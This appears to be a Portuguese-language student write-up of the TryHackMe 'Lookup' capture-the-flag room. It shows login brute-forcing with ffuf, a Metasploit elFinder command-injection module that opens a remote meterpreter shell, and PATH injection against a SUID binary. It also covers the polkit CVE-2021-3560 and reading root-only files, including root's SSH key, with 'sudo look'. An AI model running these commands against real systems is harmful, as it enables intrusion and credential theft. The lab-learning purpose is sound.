# Lookup (TryHackMe)

  - Feito em 30/08/2025
  - [Acessar desafio](https://tryhackme.com/room/lookup)


## Objetivo

Capturar as flags `user.txt` e `root.txt`, e documentar o processo.


## Grupo

Matrícula Extraordinária (Iasmim, Lucas Sala, Pedro)


## Ferramentas Utilizadas

  - [ffuf](https://github.com/ffuf/ffuf)
  - [Metasploit (msfconsole)](https://www.metasploit.com/)
  - [LinPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS)

---

## Passo a passo

<details>
  <summary>Conectar à VPN do TryHackMe</summary>

Com o arquivo de configuração do VPN já instalado, rodar no terminal:

```bash
sudo openvpn /caminho/para/o/arquivo.ovpn
```
</details>



### 1 - Resolvendo o domínio

Começamos tentando acessar o IP da máquina pelo navegador, mas nenhuma página foi carregada. Suspeitamos que fosse necessário resolver o domínio.

Para isso editamos o arquivo `/etc/hosts` com:

```bash
sudo nano /etc/hosts
```

E adicionamos:

```bash
ip.da.maquina    lookup.thm
```
Após isso, conseguimos acessar a página de login pelo link http://lookup.thm.

---

### 2 - Fuzzing

Como já tínhamos algumas dicas do desafio, pulamos a enumeração inicial com `nmap` e focamos diretamente em tentar logins e senhas padrões.

Durante os testes, percebemos dois tipos diferentes de mensagens de erro:
- Uma quando apenas a **senha** estava incorreta;
- Outra quando o **usuário ou senha** estavam incorretos.

Isso indicava que, ao encontrar um nome de usuário válido, o sistema retornava mensagens diferentes. Testando logins comuns, descobrimos que `admin` gerava a mensagem apenas da senha incorreta, sugerindo que o usuário existia.

---

#### 🔐 Fuzzing da Senha

Decidimos usar o `ffuf` para descorbir a senha do usuário `admin`. Primeiro, tivemos que descobrir o 'Content-type' do POST e para capturar o cabeçalho da requisição HTTP só tinhamos 3 segundos. O tipo era `application/x-www-form-urlencoded` e com isso prosseguimos para identificar o tamanho da resposta padrão para filtrar os resultados corretos:

```bash
ffuf -w rockyou.txt -X POST -d "username=admin&password=FUZZ" -H "Content-Type: application/x-www-form-urlencoded" -u http://lookup.thm/login.php
```

<details> <summary>📘 Explicação das flags do ffuf</summary>

  - -w rockyou.txt: Wordlist a ser usada no lugar do FUZZ

  - -X POST: Método HTTP POST

  - -d: Dados enviados no corpo da requisição

  - -H: Cabeçalho HTTP, definindo o tipo de conteúdo

  - -u: URL do endpoint com o FUZZ substituído pela wordlist

</details>

Descobrimos que a resposta padrão de erro tinha tamanho 62 e com a flag `-fs 62`, filtramos as respostas com tamanho 62 (padrão para "senha incorreta"):

```bash
ffuf ... -fs 62
```

Com isso, descobrimos a senha `password123` por gerar uma resposta de tamanho diferente. No entanto, ao testarmos `adimin:password123`, recebemos uma mensagem de usuário ou senha incorretos, e como sabíamos que o usuário existia, por eliminação indicava que **a senha estava correta**, mas não pertencia ao usuário `admin`.

---

#### 🔁 Fuzzing de Usuário

Sabendo que a senha `password123` é válida, mas não pertence ao `admin`, fizemos fuzzing no campo de **usuário**, mantendo `password123` como senha fixa. Já sabíamos o tamanho que a mensagem de erro de usuário ou senha errado tinha, então utilizamos a flag `-fs 74` para filtrar essas mensagens de erro padrão, e mantivemos a mesma wordlist:

```bash
ffuf -w rockyou.txt -X POST -d "username=FUZZ&password=password123" -H "Content-Type: application/x-www-form-urlencoded" -u http://lookup.thm/login.php -fs 74
```
Encontramos então o nome de usuário válido `jose`.

Testando `jose:password123` na tela de login, não fomos redirecionados diretamente, mas percebemos que a URL mudou, o que indicava um login bem-sucedido.

A nova URL tentava redirecionar para `files.lookup.thm`, assim já sabiamos que o erro estava relacionado ao domínio e novamente fizemos a resolução adicionando esse subdomínio no `/etc/host`, como feito anteriormente. Com isso, conseguimos acessar a página.

---

### 3 - Exploração do elFinder com Metasploit

Ao acessar `http://files.lookup.thm`, fomos redirecionados para a interface web do **elFinder**, um gerenciador de arquivos baseado em PHP.

Sabíamos, por spoilers anteriores, que essa ferramenta possui vulnerabilidades conhecidas. Após uma breve pesquisa no Google, descobrimos que versões anteriores à `2.1.48` possuiam vulnerabilidade de **command injection**, e a nossa versão era `2.1.47`. Encontramos então um exploit pronto no **Metasploit** que permite execução remota de comandos via falha no `php_connector`.

---

#### Utilizando o exploit no Metasploit

Iniciamos o **Metasploit Framework** com:

```bash
msfconsole
```
E carregamos o módulo de exploit específico para o elFinder:

```bash
use exploit/unix/webapp/elfinder_php_connector_exiftran_cmd_injection
```
Esse módulo explora uma falha no conector PHP do elFinder, que permite a **execução remota de comandos** por meio do manipulador de imagens `exiftran`.

---

#### Configuração do exploit

Com o exploit carregado, configuramos os dois parâmetros principais:

  - **LHOST**: o IP da nossa máquina na VPN do TryHackMe. Esse IP pode ser encontrado acessando http://10.10.10.10 no navegador.
  
  ```bash
  set LHOST <ip.da.vpn>
  ```
   - **RHOSTS**: o alvo, neste caso, o endereço da aplicação elFinder:
   ```bash
   set RHOSTS http://files.lookup.thm
   ```
Com tudo pronto, executamos o exploit com:
```bash
run
```
Se a exploração for bem-sucedida, o Metasploit abrirá uma sessão **meterpreter**, e para ter acesso direto ao terminal da máquina, utilizamos:
```bash
shell
```
Com isso, obtivemos acesso remoto à máquina da sala.

---

### 4 - Escalação de privilégios para o grupo `think`

Começamos explorando o terminal e os arquivos aos quais tínhamos acesso, mas não encontramos nada de útil inicialmente. Então, decidimos procurar diretamente pela primeira flag com o comando:

```bash
find . -name "user.txt" -type f 2>/dev/null
```

Que retornou `./home/think/user.txt`. Então acessamos a pasta ./home/think, mas não conseguimos abrir o arquivo user.txt por falta de permissão. Para entender melhor quem tinha acesso, usamos o comando:

```bash
ls -l user.txt
```

E recebemos o seguinte retorno:

```bash
-rw-r----- 1 root think 33 Jul 30  2023 user.txt
```
Ou seja:
  - O dono do arquivo (`root`) pode **ler e escrever**;
  - O grupo (`think`) pode **ler**;
  - Os demais usuários não têm permissão alguma.

Nosso usuário atual, até este momento, fazia parte do grupo `www-data`. Portanto, começamos a buscar formas de escalar privilégio para fazer parte do grupo `think`, e depois escalar para `root`.

Durante nossa pesquisa, encontramos este artigo: [Privilege Escalation - Linux Exploiting SUID/SGID](https://snehbavarva.medium.com/privilege-escalation-techniques-series-linux-exploiting-suid-sgid-a2f1c1b4174c), que fala sobre diferentes técnicas de escalada de privilégios em Linux, incluindo **Path Variable Injection**.

Essa técnica permite, em alguns casos, **"enganar" o sistema** a executar um binário controlado por nós, ao invés do binário real esperado, explorando o fato de que o ambiente do sistema confia na variável de ambiente `PATH`.

Identificamos o arquivo `/usr/sbin/pwm` com a permissão SUID ativa (bit de execução com privilégios do proprietário). Como binários SUID podem representar vetores de escalada, decidimos investigar executando `strings /usr/sbin/pwm`, e notamos que o binário chamava um comando `id` sem o caminho absoluto (`/usr/bin/id`). Isso nos levou a suspeitar que o binário fosse vulnerável a **Path Variable Injection**.

Para explorar isso, criamos um script chamado `id` no diretório `/tmp`, com o seguinte conteúdo:

```bash
cd /tmp
echo '#!/bin/bash' > id
echo 'echo "uid=1000(think) gid=1000(think) groups=1000(think)"' >> id
chmod +x id
```
Esse script simula a execução do comando `id`, retornando que somos o usuário `think`. Em seguida, modificamos a variável de ambiente `PATH` para que o sistema procure primeiro em `/tmp`:

```bash
export PATH=/tmp:$PATH
```
Então executamos o binário SUID:

```bash
/usr/sbin/pwm
```

E tivemos acesso ao conteúdo de um arquivo `.password` que continha uma lista de possíveis senhas. Dividimos o trabalho e começamos a testá-las como possíveis senha SSH. Ao testar:

```bash
ssh think@ip.da.maquina
```
E usar a senha `josemario.AKA(think)`, conseguimos acesso. Com isso, acessamos o sistema como usuário `think` e finalmente conseguimos  primeira flag.

--- 

### 5 - Escalação de privilégio para root

Após obter acesso ao shh de `think`, fizemos uma cópia segura do `linpeas` da nossa máquina, para o diretório `/tmp` da máquina sendo explorada com o comando:

```bash
scp linpeas.sh think@ip_da_maquina:/tmp
```
Acessamos novamente a máquina via SSH e, na pasta `/tmp`, executamos o `linpeas` com o comando:

```bash
sh linpeas.sh
```
Que retornou um aviso crítico de uma vulnerabilidade ao CVE-2021-3560. Pesquisando sobre, descobrimos que essa vulnerabilidade afeta a ferramenta `pkexec` e permite que um usuário **não privilegiado** obtenha **acesso root** localmente.

<details> 
<summary>Escalando privilégio → CVE-2021-3560</summary>

Rodando o `linpeas` identificamos que a máquina era vulnerável à **CVE-2021-3560**, uma falha crítica no `polkit` que permite a escalada de privilégios sem autenticação, explorando uma condição de corrida no `pkexec`.

A exploração consiste em executar um comando que interage com o `polkit` (como criar um novo usuário administrador) via D-Bus, e **interromper a solicitação no momento exato** antes da autenticação ser exigida. Se o tempo for correto, o `polkit` acaba autorizando a ação sem validação adequada.

Começamos a explorar esse caminho, mas acabamos encontrando a flag de outra forma antes de concluir a exploração.

</details>


Paralelo a isso rodamos o comando `sudo -l` para listar os privilégios de sudo que o usuário `think` possui e descobrimos que o usuário `think` tinha acesso ao comando `look`*, ou seja, poderiamos abrir qualquer arquivo, mesmo sem autorização para acessar o diretório. Como normalmente a flag do `root` está localizada em `/root/root.txt` testamos direto acessar o conteúdo deste arquivo com o comando:

```bash
sudo look "" /root/root.txt
```

<details> <summary>Explicação do comando look</summary>
O comando 'look' procura e exibe todas as linhas de  um arquivo que começam com uma string específica (prefixo), ou seja, colocando a string vazia (""), ele mostrará todo conteúdo do arquivo.
</details>

Assim conseguimos acesso a última flag e concluímos o desafio.

Após concluir o desafio, ao analisar outros write-ups, descobrimos que também seria possível utilizar esse mesmo comando para ler o conteúdo da chave SSH do usuário root (`/root/.ssh/id_rsa`), o que permitiria estabelecer uma conexão SSH como root e acessar a última flag.

  
